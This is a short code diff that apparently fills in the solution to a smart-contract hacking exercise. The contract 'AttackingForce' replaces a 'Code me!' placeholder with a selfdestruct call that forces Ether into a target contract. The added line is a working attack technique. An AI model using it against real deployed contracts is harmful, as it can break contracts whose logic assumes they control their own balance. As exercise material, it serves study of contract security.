@@ -10,6 +10,6 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        selfdestruct(payable(contractAddress)); // Choo-choo, here comes the forced ETH!!
     }
 }
